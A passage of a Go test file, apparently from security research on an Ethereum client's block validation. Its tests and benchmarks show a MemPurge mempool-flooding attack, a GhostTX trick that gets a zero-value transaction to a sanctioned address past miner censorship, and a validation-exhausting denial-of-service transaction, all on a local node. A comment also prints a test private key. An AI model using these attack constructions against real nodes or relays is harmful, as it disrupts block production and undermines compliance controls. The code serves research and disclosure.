		"The attacker sends a single chain of 64 TXs, each one pays 10000 more than the base fee.",
		"The attacker is the only one sending TXs in this test.",
		"But, MemPurge makes sure that at most, just a single attack TX will be included in the next block. ",
		"Number of attacker TXs in the block: ", countTxsTo(blockRequest.ExecutionPayload.Transactions, &addrs),
	)
}

// TestMemPurgeCircumventsProtections shows that the attack works, in spite of
// protections put in place to mitigate other attacks, for example DETER.
func TestMemPurgeCircumventsProtections(t *testing.T) {
	genesis, initBlocks, validatorKey, validatorAddr, _, _, attackerKeys, attackerAddrs := createState(1, attackCode, 0, 80, false)
	node, ethservice, signer := createNode(genesis, initBlocks, validatorAddr, false, false)
	defer node.Close()

	api := createApi(ethservice, validatorAddr, false)
	txPool := ethservice.TxPool()
	gasLimit := ethservice.BlockChain().GasLimit() - 21000 - 8295
	baseFee := ethservice.Miner().PendingBlock().BaseFee()
	attackerFee := new(big.Int).Mul(baseFee, big.NewInt(10000))

	// Create a random address that the TXs will be sent to
	key, _ := crypto.GenerateKey()
	addrs := crypto.PubkeyToAddress(key.PublicKey)

	// All attack addresses should have 0 TXs before we start
	_, attackerPending := getPending(txPool, []common.Address{}, attackerAddrs)
	require.EqualValues(t, 0, len(attackerPending))

	for _, tx := range createMemPurgeTxs(
		ethservice, txPool, signer, attackerAddrs, attackerKeys, 64,
		&addrs, big.NewInt(1), gasLimit, attackerFee, attackerFee, nil,
	) {
		txPool.AddRemotesSync([]*types.Transaction{tx})
	}

	// The attacker should succeed in filling the mempool
	_, attackerPending = getPending(txPool, []common.Address{}, attackerAddrs)
	require.EqualValues(t, 5120, len(attackerPending))

	// If the current validator is not censoring, this block will contain at
	// most two transaction: the proposer payment TX + one TX by the attacker
	blockRequest := createBlock(ethservice, api, validatorKey, validatorAddr)
	require.EqualValues(t, 2, len(blockRequest.ExecutionPayload.Transactions))
}

// createMemPurgeTxs creates the MemPurge attack's transaction chain.
func createMemPurgeTxs(
	ethservice *eth.Ethereum, txPool *txpool.TxPool, signer types.Signer,
	addrs []common.Address, keys []*ecdsa.PrivateKey, chainLen uint64,
	to *common.Address, value *big.Int, gas uint64, gasFee *big.Int,
	gasTip *big.Int, data []byte,
) types.Transactions {
	statedb, _ := ethservice.BlockChain().State()
	txs := types.Transactions{}
	for i, addr := range addrs {
		firstNonce := txPool.Nonce(addr)
		for nonceAdd := uint64(1) ; nonceAdd < chainLen ; nonceAdd += 1 {
			tx, _ := types.SignTx(types.NewTx(&types.DynamicFeeTx{
				Nonce:     firstNonce + nonceAdd,
				To:        to,
				Value:     value,
				Gas:       gas,
				GasFeeCap: gasFee,
				GasTipCap: gasTip,
				Data:      data,
			}), signer, keys[i])
			txs = append(txs, tx)
		}

		// Create the initial TX that starts the attack, first without transferring
		// any value. This allows to first figure out how much gas the TX will
		// consume, and then recreate the TX so that it will transfer a value
		// which is equal to the attacker's balance, minus the cost of the TX,
		// meaning that it will deplete the attacker's balance.
		tx, _ := types.SignTx(types.NewTx(&types.DynamicFeeTx{
			Nonce:     firstNonce,
			To:        to,
			Value:     big.NewInt(0),
			Gas:       gas,
			GasFeeCap: gasFee,
			GasTipCap: gasTip,
			Data:      data,
		}), signer, keys[i])
		tx, _ = types.SignTx(types.NewTx(&types.DynamicFeeTx{
			Nonce:     firstNonce,
			To:        to,
			Value:     new(big.Int).Sub(statedb.GetBalance(addr),tx.Cost()),
			Gas:       gas,
			GasFeeCap: gasFee,
			GasTipCap: gasTip,
			Data:      data,
		}), signer, keys[i])
		txs = append(txs, tx)
	}
	return txs
}

// Creates txNum transactions per key
func createTxs(
	txPool *txpool.TxPool, signer types.Signer, addrs []common.Address,
	keys []*ecdsa.PrivateKey, txNum uint64, to *common.Address,
	value *big.Int, gas uint64, gasFee *big.Int, gasTip *big.Int,
	data []byte,
) types.Transactions {
	i := 0
	txs := make(types.Transactions, len(addrs) * int(txNum))
	for j, addr := range addrs {
		for curNum := uint64(0); curNum < txNum; curNum += 1 {
			nonce := txPool.Nonce(addr)
			tx, _ := types.SignTx(types.NewTx(&types.DynamicFeeTx{
				Nonce:     nonce + curNum,
				To:        to,
				Value:     value,
				Gas:       gas,
				GasFeeCap: gasFee,
				GasTipCap: gasTip,
				Data:      data,
			}), signer, keys[j])
			txs[i] = tx
			i += 1
		}
	}
	return txs
}

// Returns the pending honest and attacker TXs that are currently in the mempool
func getPending(
	txPool *txpool.TxPool, honestAddrs []common.Address,
	attackerAddrs []common.Address,
) (types.Transactions, types.Transactions) {
	honestTxs := types.Transactions{}
	attackerTxs := types.Transactions{}
	for _, addr := range honestAddrs {
		newTxs, _ := txPool.ContentFrom(addr)
		honestTxs = append(honestTxs, newTxs...)
	}
	for _, addr := range attackerAddrs {
		newTxs, _ := txPool.ContentFrom(addr)
		attackerTxs = append(attackerTxs, newTxs...)
	}
	return honestTxs, attackerTxs
}

// TestGhostTx shows that the GhostTX attack works.
func TestGhostTx(t *testing.T) {
	// If the GhostTX attack TX transfers a value of 1, it gets caught by the
	// builder's censorship method.
	t.Log("Testing GhostTX with a value of 1.")
	helperGhostTx(t, 1)

	// If the GhostTX attack TX transfers a value of 2, it gets caught by the
	// builder's censorship method.
	t.Log("Testing GhostTX with a value of 2.")
	helperGhostTx(t, 2)

	// If the GhostTX attack TX transfers a value of 0, it doesnt get caught by
	// the builder's censorship method, but does get caught by the API.
	t.Log("Testing GhostTX with a value of 0.")
	helperGhostTx(t, 0)

	t.Log("Attack worked!")
}

// TestGhostTxOne shows that one can create TXs that transfers 1 value to
// sanctioned entities, and thus Builders will not include them in their blocks.
func helperGhostTx(t *testing.T, value int64) {
	if (value < 0) {
		return
	}
	var err error
	attackCode = combinedAttackCode
	attackData = common.Hex2Bytes("02069f7d00000000000000000000000000000000000000000000000000000000011000000000000000000000000000000000000000000000000000000000000000000000")
	
	genesis, initBlocks, validatorKey, validatorAddr, _, _, attackerKeys, attackerAddrs := createState(1, attackCode, 0, 1, false)
	node, ethservice, signer := createNode(genesis, initBlocks, validatorAddr, true, false)
	defer node.Close()
	
	api := createApi(ethservice, validatorAddr, true)
	txPool := ethservice.TxPool()
	nonce := txPool.Nonce(attackerAddrs[0])
	gasLimit := uint64(20000000)
	attackerTo := getContractAddress(ethservice, nil)
	
	baseFee := ethservice.Miner().PendingBlock().BaseFee()
	tx, _ := types.SignTx(types.NewTx(&types.DynamicFeeTx{
		Nonce:     nonce,
		To:        &attackerTo,
		Value:     big.NewInt(value),
		Gas:       gasLimit,
		GasFeeCap: baseFee,
		GasTipCap: baseFee,
		Data:      attackData,
	}), signer, attackerKeys[0])
	txPool.AddLocal(tx)
	t.Log("Created a TX that transfers", value, "wei to a sanctioned entity.")
	
	blockRequest := createBlock(ethservice, api, validatorKey, validatorAddr)
	t.Log("Created a block using the standard block creation method.")

	// GhostTX works only with a value of 0
	if value == 0 {
		// If the value is equal to 0, then the TX will not be caught by
		// the inner validation, but will be caught by the API. Thus, the TX
		// will be included in block by the builder.
		// But, the external API does catch it.

		// Builders include this TX in a block, even though it sends 0 wei to a sanctioned address
		require.EqualValues(t, 2, len(blockRequest.ExecutionPayload.Transactions))
		require.EqualValues(t, 1, countTxsTo(blockRequest.ExecutionPayload.Transactions, &attackerTo))
		t.Log("The block contains the attacker's TX.")

		// On the other hand, the validation API is strict and flags this TX
		err = api.ValidateBuilderSubmissionV2(blockRequest)
		require.ErrorContains(t, err, "blacklisted")
		t.Log("The block does not pass the external API's validation.")
	} else {
		// If the value is larger than 0, then the TX will be caught by both
		// the inner validation, and the API. Thus, the TX will not be included
		// in a block by the builder.

		// Builders ignore this TX when constructing a block, because it sends 1 wei
		require.EqualValues(t, 1, len(blockRequest.ExecutionPayload.Transactions))
		require.EqualValues(t, 0, countTxsTo(blockRequest.ExecutionPayload.Transactions, &attackerTo))
		t.Log("The block does not contain the attacker's TX.")

		// There is nothing to flag, because the TX was caught beforehand
		err = api.ValidateBuilderSubmissionV2(blockRequest)
		require.NoError(t, err)
		t.Log("The block passes the external API's validation.")
	}
}

// To run this, go to the folder housing this file (eth/block-validation)
// and run: "go test -run=^$ -v -bench BenchmarkCreateConditionalExhaustTx -benchtime=10000x -timeout=0"
// One sample output we got:
// BenchmarkCreateConditionalExhaustTx-128            10000             55283 ns/op
//                                                    ^ # of runs       ^ ns per iteration
func BenchmarkCreateConditionalExhaustTx(b *testing.B) {
	var tx *types.Transaction

	genesis, initBlocks, _, validatorAddr, _, _, attackerKeys, attackerAddrs := createState(1, attackCode, 0, 1, false)
	node, ethservice, signer := createNode(genesis, initBlocks, validatorAddr, true, false)
	defer node.Close()

	// Create variable that are used to create the TXs before benchmarking
	gasLimit := ethservice.BlockChain().GasLimit() - 21000 - 8295
	nonce := ethservice.TxPool().Nonce(attackerAddrs[0])
	attackDataStr := conditionalExhaustDataStr
	txBase := attackDataStr[:len(attackDataStr)-5]
	zero := big.NewInt(0)
	attackerTo := getContractAddress(ethservice, nil)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		// Create multiple attack TXs and sign each one
		tx, _ = types.SignTx(types.NewTx(&types.DynamicFeeTx{
			Nonce:     nonce,
			To:        &attackerTo,
			Value:     zero,
			Gas:       gasLimit,
			GasFeeCap: ethservice.Miner().PendingBlock().BaseFee(),
			GasTipCap: zero,
			Data:      common.Hex2Bytes(txBase + strconv.Itoa(i)),
		}), signer, attackerKeys[0])
    }
	b.StopTimer()
	// Store result to a package variable, so the compiler won't eliminate the benchmark itself
	packageTx = tx
}

// To run this, go to the folder housing this file (eth/block-validation)
// and run: "go test -run=^$ -v -bench BenchmarkValidateConditionalExhaustTx -benchtime=10000x -timeout=0"
// Some sample outputs we got:
// BenchmarkValidateConditionalExhaustTx-128          10000         109022987 ns/op
//                                                    ^ # of runs   ^ ns per iteration
func BenchmarkValidateConditionalExhaustTx(b *testing.B) {
	validateTxHelper(b, conditionalExhaustCode, conditionalExhaustData)
}

// To run this, go to the folder housing this file (eth/block-validation)
// and run: "go test -run=^$ -v -bench BenchmarkValidateHonestTx -benchtime=10000x -timeout=0"
// Some sample outputs we got:
// BenchmarkValidateHonestTx-128             100000           1265643 ns/op
//                                           ^ # of runs      ^ ns per iteration
func BenchmarkValidateHonestTx(b *testing.B) {
	validateTxHelper(b, nil, nil)
}

// Benchmarks sending a transaction using the given data
func validateTxHelper(b *testing.B, attackCode []byte, attackData []byte) {
	var err error

	// We initialize a new Ethereum node that does not censor at the miner level.
	// If we do enable miner-level censorship, the miner's block construction
	// logic would ignore sanctioned transactions.
	// So, we disable it, construct a block with a sanctioned transaction, and
	// then use flashbots' block validation API to validate the block.
	// This is similar to the logic used by flashbot relays.
	genesis, initBlocks, validatorKey, validatorAddr, _, _, attackerKeys, attackerAddrs := createState(1, attackCode, 0, 1, false)
	node, ethservice, signer := createNode(genesis, initBlocks, validatorAddr, false, false)
	defer node.Close()

	var toAddr common.Address
	if attackCode == nil {
		toAddr = validatorAddr
	} else {
		toAddr = getContractAddress(ethservice, nil)
	}
	
	// Create the attack TX
	tx, _ := types.SignTx(types.NewTx(&types.DynamicFeeTx{
		Nonce:     ethservice.TxPool().Nonce(attackerAddrs[0]),
		To:        &toAddr,
		Value:     big.NewInt(10),
		// Leave enough gas for the proposer payment TX
		Gas:       ethservice.BlockChain().GasLimit() - 21000 - 8295,
		GasFeeCap: ethservice.Miner().PendingBlock().BaseFee(),
		GasTipCap: ethservice.Miner().PendingBlock().BaseFee(),
		Data:      attackData,
	}), signer, attackerKeys[0])
	ethservice.TxPool().AddLocal(tx)

	// Assemble the block
	api := createApi(ethservice, validatorAddr, false)
	blockRequest := createBlock(ethservice, api, validatorKey, validatorAddr)
	
	// Measure the time required to validate the block
	api = createApi(ethservice, validatorAddr, true)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		// Record the result of a function call, so the compiler will not
		// optimize the call by eliminating it
		err = api.ValidateBuilderSubmissionV2(blockRequest)
    }
	b.StopTimer()
	// Store result to a package variable, so the compiler will not eliminate
	// the benchmark itself
	packageErr = err
}

// Creates a new block validation API
func createApi(ethservice *eth.Ethereum, validatorAddr common.Address,
	verifyCensorship bool,
) *BlockValidationAPI {
	api := NewBlockValidationAPI(ethservice, nil)
	if verifyCensorship {
		// Set the access verifier to block the censored address
		api.accessVerifier = &AccessVerifier{
			blacklistedAddresses: map[common.Address]struct{}{blacklistedAddress: {}},
		}
	}
	return api
}

// createNode creates a full node instance for testing.
// verifyCensorship turns on censorship at the miner level, meaning that blocks
// are filled only with transactions that should not be censored.
func createNode(
	genesis *core.Genesis, blocks []*types.Block, validatorAddr common.Address,
	verifyCensorship bool, testnet bool,
) (*node.Node, *eth.Ethereum, types.Signer) {
	log.Root().SetHandler(log.LvlFilterHandler(log.LvlInfo, log.StreamHandler(os.Stderr, log.TerminalFormat(true))))
	fdlimit.Raise(2048)
	var ethcfg *ethconfig.Config
	var ethnode *node.Node

	// We use the default parameters for the testing node.
	// But, for running the testnet, we use the clique consensus, which is more
	// lightweight and can run standalone, without an additional consensus client.
	minerDefault := ethconfig.Defaults.Miner
	// minerDefault.AlgoType = miner.ALGO_GREEDY
	// If minerCensorship is true, then the node will perform censorship at the
	// miner-level, meaning it will not include transactions that should be
	// censored in blocks that it creates.
	if verifyCensorship {
		minerDefault.Blocklist = append(minerDefault.Blocklist, blacklistedAddress)
	}
	if testnet {
		ethcfg = &ethconfig.Config{
			Genesis: 		 genesis,
			TxPool: 		 ethconfig.Defaults.TxPool,
			Miner: 			 minerDefault,
			GPO: 			 ethconfig.Defaults.GPO,
			NetworkId:       genesis.Config.ChainID.Uint64(),
			SyncMode:        downloader.FullSync,
			DatabaseCache:   256,
			DatabaseHandles: 256,
		}
	} else {
		ethcfg = &ethconfig.Config{
			Genesis: 		 genesis,
			Ethash: 		 ethash.Config{PowMode: ethash.ModeFake},
			SyncMode: 		 downloader.SnapSync,
			TrieTimeout: 	 time.Minute,
			TrieDirtyCache:  256,
			TrieCleanCache:  256,
			TxPool: 		 ethconfig.Defaults.TxPool,
			Miner: 			 minerDefault,
			GPO: 			 ethconfig.Defaults.GPO,
			NetworkId:       genesis.Config.ChainID.Uint64(),
		}
	}

	// Start the node
	if testnet {
		datadir, _ := os.MkdirTemp("", "")
		ethnode, _ = node.New(&node.Config{
			Name:    "geth",
			Version: params.Version,
			DataDir: datadir,
			P2P: p2p.Config{
				ListenAddr:  "0.0.0.0:0",
				NoDiscovery: true,
				MaxPeers:    25,
			},
		})
	} else {
		ethnode, _ = node.New(&node.Config{
			P2P: p2p.Config{
				ListenAddr:  "0.0.0.0:0",
				NoDiscovery: true,
				MaxPeers:    25,
			},
		})
	}

	ethservice, _ := eth.New(ethnode, ethcfg)
	ethnode.Start()
	if _, err := ethservice.BlockChain().InsertChain(blocks); err != nil {
		ethnode.Close()
	}
	// Give txpool time to consume head event
	time.Sleep(500 * time.Millisecond)

	// Set the address of our testnet's validator
	ethservice.SetEtherbase(validatorAddr)
	ethservice.APIBackend.Miner().SetEtherbase(validatorAddr)

	// Set the node as synced, and let it reach the Terminal Total Difficulty
	// and perform The Merge (Ethereum's transition to Proof-of-Stake).
	ethservice.SetSynced()
	if !testnet {
		ethservice.Merger().ReachTTD()
	}

	return ethnode, ethservice, types.LatestSigner(ethservice.BlockChain().Config())
}

// Initializes a random blockchain state
func createState(
	chainLen int, attackContractCode []byte, honestKeyNum, attackerKeyNum int,
	testnet bool,
) (
	*core.Genesis, []*types.Block, *ecdsa.PrivateKey, common.Address,
	[]*ecdsa.PrivateKey, []common.Address, []*ecdsa.PrivateKey,
	[]common.Address,
) {
	// Set up private,public keypairs for the validator
	validatorKey, _ := crypto.GenerateKey()
	validatorAddr   := crypto.PubkeyToAddress(validatorKey.PublicKey)
	honestKeys, honestAddrs, attackerKeys, attackerAddrs := createKeys(honestKeyNum, attackerKeyNum)
	initBlocks, genesis := createInitBlocks(
		chainLen, validatorKey, validatorAddr, honestKeys, honestAddrs,
		attackerKeys, attackerAddrs, testnet,
	)

	// If not running a testnet, then make sure to use the Shanghai update, as
	// the tests assume blocks contain withdrawls
	if ((!testnet) && (len(initBlocks) > 0)) {
		blockTime := initBlocks[len(initBlocks)-1].Time() + 5
		genesis.Config.ShanghaiTime = &blockTime
	}
	return genesis, initBlocks, validatorKey, validatorAddr, honestKeys, honestAddrs, attackerKeys, attackerAddrs
}

// Create keys for everyone
func createKeys(honestKeyNum, attackerKeyNum int) (
	[]*ecdsa.PrivateKey, []common.Address, []*ecdsa.PrivateKey, []common.Address,
){
	// Create additional keys for the attacker and honest users
	honestKeys  := make([]*ecdsa.PrivateKey, honestKeyNum)
	honestAddrs := make([]common.Address, honestKeyNum)
	for i := range honestKeys {
		honestKeys[i], _ = crypto.GenerateKey()
		honestAddrs[i] = crypto.PubkeyToAddress(honestKeys[i].PublicKey)
	}

	attackerKeys  := make([]*ecdsa.PrivateKey, attackerKeyNum)
	attackerAddrs := make([]common.Address, attackerKeyNum)
	for i := range attackerKeys {
		attackerKeys[i], _ = crypto.GenerateKey()
		attackerAddrs[i] = crypto.PubkeyToAddress(attackerKeys[i].PublicKey)
	}
	return honestKeys, honestAddrs, attackerKeys, attackerAddrs
}

// Returns the address of the contract deployed by the given transaction.
// If the transactoin is nil, the address of the contract deployed by the first
// transaction of block number 1 is returned, if indeed the transaction deployed
// a contract.
// If you assume that the attacker's secret key is: 503f38a9c967ed597e47fe25643985f032b072db8075426a92110f82df48dfcb
// And its public key is: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
// Then, if the contract was deployed as the attacker's first transaction, the
// address is: 0xd9145CCE52D386f254917e481eB44e9943F39138
// To get these values, you can put the following at the end of init():
// attackerKeys[0], _ = crypto.HexToECDSA("503f38a9c967ed597e47fe25643985f032b072db8075426a92110f82df48dfcb")
// attackerAddrs[0] = crypto.PubkeyToAddress(attackerKeys[0].PublicKey)
func getContractAddress(ethservice *eth.Ethereum, tx *types.Transaction) common.Address {
	if tx != nil {
		tx, blockHash, _, index, _ := ethservice.APIBackend.GetTransaction(context.Background(), tx.Hash())
		if tx != nil {
			return ethservice.BlockChain().GetReceiptsByHash(blockHash)[index].ContractAddress
		}
	} else {
		block := ethservice.BlockChain().GetBlockByNumber(1)
		if (block != nil) && (block.Hash() != common.Hash{}) {
			receipts := ethservice.BlockChain().GetReceiptsByHash(block.Hash())
			if len(receipts) > 0 {
				return receipts[0].ContractAddress
			}
		}
	}
	return common.Address{}
}

// Creates multiple blocks, the first one contains the smart contract that
// will facilitate our DoS attack, and the others contain all kins of random
// transactions that are supposed to create a complex state trie.
func createInitBlocks(
	blockNum int, validatorKey *ecdsa.PrivateKey, validatorAddr common.Address,
	honestKeys []*ecdsa.PrivateKey, honestAddrs []common.Address,
	attackerKeys []*ecdsa.PrivateKey, attackerAddrs []common.Address, testnet bool,
) ([]*types.Block, *core.Genesis) {
	db := rawdb.NewMemoryDatabase()
	defer db.Close()
	
	// Allocate funds to important users
	allocMap := make(core.GenesisAlloc)
	defaultBalance := math.BigPow(2, 256)
	allocMap[validatorAddr] = core.GenesisAccount{Balance: defaultBalance}
	for _, addr := range honestAddrs {
		allocMap[addr] = core.GenesisAccount{Balance: defaultBalance}
	}
	for _, addr := range attackerAddrs {
		allocMap[addr] = core.GenesisAccount{Balance: defaultBalance}
	}

	if testnet {
		config := *params.AllCliqueProtocolChanges
		config.Clique = &params.CliqueConfig{
			Period: 12,
			Epoch:  config.Clique.Epoch,
		}

		genesis := &core.Genesis{
			Config:     &config,
			GasLimit:   30000000,
			BaseFee:    big.NewInt(params.InitialBaseFee),
			Difficulty: big.NewInt(0),
			Alloc: 		allocMap,
		}

		// genesis.Config.ChainID = big.NewInt(18)
		signers := make([]common.Address, 1)
		signers[0] = crypto.PubkeyToAddress(validatorKey.PublicKey)
		for i := 0; i < len(signers); i++ {
			for j := i + 1; j < len(signers); j++ {
				if bytes.Compare(signers[i][:], signers[j][:]) > 0 {
					signers[i], signers[j] = signers[j], signers[i]
				}
			}
		}
		genesis.ExtraData = make([]byte, 32+(len(signers)*common.AddressLength)+65)
		for i, signer := range signers {
			copy(genesis.ExtraData[32+i*common.AddressLength:], signer[:])
		}
		return []*types.Block{}, genesis
	}

	config := params.AllEthashProtocolChanges
	genesis := &core.Genesis{
		Config:     config,
		Alloc:      allocMap,
		ExtraData:  []byte("test genesis"),
		Timestamp:  9000,
		BaseFee:    big.NewInt(params.InitialBaseFee),
		Difficulty: big.NewInt(0),
		GasLimit:   30000000,
	}

	generate := func(i int, g *core.BlockGen) {
		g.SetCoinbase(validatorAddr)
		if i == 0 {
			// Create the attack contract
			tx, _ := types.SignTx(types.NewContractCreation(
				g.TxNonce(attackerAddrs[0]), new(big.Int), 30000000, g.BaseFee(),
				attackCode,
			), types.LatestSigner(config), attackerKeys[0])
			g.AddTx(tx)
		} else if i == 1 {
			ringTxsBlockGenerator(
				honestKeys, honestAddrs, defaultBalance, len(honestAddrs),
			)(i, g)
		} else if i < 10{
			valueTxBlockGenerator(validatorKey, validatorAddr, 100*1024)(i, g)
		} else {
			j := int((g.PrevBlock(i - 1).GasLimit() / 21000) / 4)
			for j > 0 {
				j--
				curKey, _ := crypto.GenerateKey()
				curAddr := crypto.PubkeyToAddress(curKey.PublicKey)
				tx, _ := types.SignTx(types.NewTx(&types.DynamicFeeTx{
					Nonce:     g.TxNonce(validatorAddr),
					To:        &curAddr,
					Value:     big.NewInt(0),
					Gas:       21000,
					GasFeeCap: g.BaseFee(),
					GasTipCap: big.NewInt(0),
					Data:      nil,
				}), types.LatestSigner(config), validatorKey)
				g.AddTx(tx)
			}
		}
	}
	gblock := genesis.MustCommit(db)
	engine := ethash.NewFaker()
	blocks, _ := core.GenerateChain(config, gblock, engine, db, blockNum, generate)
	totalDifficulty := big.NewInt(0)
	for _, b := range blocks {
		totalDifficulty.Add(totalDifficulty, b.Difficulty())
	}
	config.TerminalTotalDifficulty = totalDifficulty

	return blocks, genesis
}

// valueTxBlockGenerator returns a block generator that includes a single
// value-transfer transaction with n bytes of extra data in each block.
func valueTxBlockGenerator(
	validatorKey *ecdsa.PrivateKey, validatorAddr common.Address, nbytes int,
) func(int, *core.BlockGen) {
	return func(i int, gen *core.BlockGen) {
		toaddr := common.Address{}
		data := make([]byte, nbytes)
		gas, _ := core.IntrinsicGas(data, nil, false, false, false, false)
		signer := types.MakeSigner(params.AllEthashProtocolChanges, big.NewInt(int64(i)))
		gasPrice := big.NewInt(0)
		if gen.BaseFee() != nil {
			gasPrice = gen.BaseFee()
		}
		tx, _ := types.SignNewTx(validatorKey, signer, &types.LegacyTx{
			Nonce:    gen.TxNonce(validatorAddr),
			To:       &toaddr,
			Value:    big.NewInt(1),
			Gas:      gas,
			Data:     data,
			GasPrice: gasPrice,
		})
		gen.AddTx(tx)
	}
}

// ringTxsBlockGenerator returns a block generator that sends ETH in a ring among n accounts.
// This creates ringLen entries in the state database and fills the blocks with many
// small transactions.
func ringTxsBlockGenerator(
	keys []*ecdsa.PrivateKey, addrs []common.Address, defaultBalance *big.Int, ringLen int,
) func(int, *core.BlockGen) {
	from := 0
	availableFunds := new(big.Int).Set(defaultBalance)
	return func(i int, gen *core.BlockGen) {
		block := gen.PrevBlock(i - 1)
		gas := block.GasLimit()
		gasPrice := big.NewInt(0)
		if gen.BaseFee() != nil {
			gasPrice = gen.BaseFee()
		}
		signer := types.MakeSigner(params.AllEthashProtocolChanges, big.NewInt(int64(i)))
		for {
			gas -= params.TxGas
			if gas < params.TxGas {
				break
			}
			to := (from + 1) % ringLen
			burn := new(big.Int).SetUint64(params.TxGas)
			burn.Mul(burn, gen.BaseFee())
			availableFunds.Sub(availableFunds, burn)
			if availableFunds.Cmp(big.NewInt(1)) < 0 {
				panic("Not enough funds")
			}
			tx, err := types.SignNewTx(keys[from], signer,
				&types.LegacyTx{
					Nonce:    gen.TxNonce(addrs[from]),
					To:       &addrs[to],
					Value:    availableFunds,
					Gas:      params.TxGas,
					GasPrice: gasPrice,
				})
			if err != nil {
				panic(err)
			}
			gen.AddTx(tx)
			from = to
		}
	}
}

// Creates a block, including a TX that pays the proposer's fee recipient
func createBlock(
	ethservice *eth.Ethereum, api *BlockValidationAPI,
	validatorKey *ecdsa.PrivateKey, validatorAddr common.Address,
) *BuilderBlockValidationRequestV2 {
	withdrawals := []*types.Withdrawal{}
	proposerAddr := bellatrix.ExecutionAddress{}
	copy(proposerAddr[:], validatorAddr.Bytes())
	parent := ethservice.BlockChain().CurrentBlock()

	// Create a TX that pays the proposer's fee recipient address, otherwise block isn't valid
	statedb, _ := ethservice.BlockChain().StateAt(parent.Root)
	tx, _ := types.SignTx(types.NewTx(&types.DynamicFeeTx{
		Nonce:     statedb.GetNonce(validatorAddr),
		To:        &validatorAddr,
		Value:     big.NewInt(0),
		Gas:       21000,
		GasFeeCap: ethservice.Miner().PendingBlock().BaseFee(),
		GasTipCap: ethservice.Miner().PendingBlock().BaseFee(),
		Data:      nil,
	}), types.LatestSigner(ethservice.BlockChain().Config()), validatorKey)
	ethservice.TxPool().AddLocal(tx)

	timestamp := uint64(time.Now().Unix()) + uint64(time.Second)
	if timestamp <= parent.Time {
		timestamp = parent.Time + 1
	}
	execData, _ := assembleExecutionPayloadData(api, parent.Hash(),
		&engine.PayloadAttributes{
			Timestamp:             timestamp,
			Withdrawals:           withdrawals,
			SuggestedFeeRecipient: validatorAddr,
		},
	)
	payload, _ := executableDataToExecutionPayloadV2(execData)

	blockRequest := &BuilderBlockValidationRequestV2{
		SubmitBlockRequest: capellaapi.SubmitBlockRequest{
			Signature: phase0.BLSSignature{},
			Message: &apiv1.BidTrace{
				ParentHash:           phase0.Hash32(execData.ParentHash),
				BlockHash:            phase0.Hash32(execData.BlockHash),
				ProposerFeeRecipient: proposerAddr,
				GasLimit:             execData.GasLimit,
				GasUsed:              execData.GasUsed,
				Value:                uint256.NewInt(0),
			},
			ExecutionPayload: payload,
		},
		RegisteredGasLimit: execData.GasLimit,
		WithdrawalsRoot:    types.DeriveSha(types.Withdrawals(withdrawals), trie.NewStackTrie(nil)),
	}

	return blockRequest
}

// Assembles the next block's payload, chooses which transactions to include
func assembleExecutionPayloadData(api *BlockValidationAPI, parentHash common.Hash,
		params *engine.PayloadAttributes) (*engine.ExecutableData, error) {
	args := &miner.BuildPayloadArgs{
		Parent:       parentHash,
		Timestamp:    params.Timestamp,
		FeeRecipient: params.SuggestedFeeRecipient,
		GasLimit:     params.GasLimit,
		Random:       params.Random,
		Withdrawals:  params.Withdrawals,
	}

	payload, err := api.eth.Miner().BuildPayload(args)
	if err != nil {
		return nil, err
	}
	if payload := payload.ResolveFull(); payload != nil {
		return payload.ExecutionPayload, nil
	}
	return nil, errors.New("Payload did not resolve")
}

// Creates a valid block payload
func executableDataToExecutionPayloadV2(data *engine.ExecutableData) (*capella.ExecutionPayload, error) {
	transactionData := make([]bellatrix.Transaction, len(data.Transactions))
	for i, tx := range data.Transactions {
		transactionData[i] = bellatrix.Transaction(tx)
	}

	withdrawalData := make([]*capella.Withdrawal, len(data.Withdrawals))
	for i, withdrawal := range data.Withdrawals {
		withdrawalData[i] = &capella.Withdrawal{
			Index:          capella.WithdrawalIndex(withdrawal.Index),
			ValidatorIndex: phase0.ValidatorIndex(withdrawal.Validator),
			Address:        bellatrix.ExecutionAddress(withdrawal.Address),
			Amount:         phase0.Gwei(withdrawal.Amount),
		}
	}

	baseFeePerGas := new(boostTypes.U256Str)
	err := baseFeePerGas.FromBig(data.BaseFeePerGas)
	if err != nil {
		return nil, err
	}

	return &capella.ExecutionPayload{
		ParentHash:    [32]byte(data.ParentHash),
		FeeRecipient:  [20]byte(data.FeeRecipient),
		StateRoot:     [32]byte(data.StateRoot),
		ReceiptsRoot:  [32]byte(data.ReceiptsRoot),
		LogsBloom:     boostTypes.Bloom(types.BytesToBloom(data.LogsBloom)),
		PrevRandao:    [32]byte(data.Random),
		BlockNumber:   data.Number,
		GasLimit:      data.GasLimit,
		GasUsed:       data.GasUsed,
		Timestamp:     data.Timestamp,
		ExtraData:     data.ExtraData,
		BaseFeePerGas: *baseFeePerGas,
		BlockHash:     [32]byte(data.BlockHash),
		Transactions:  transactionData,
		Withdrawals:   withdrawalData,
	}, nil
}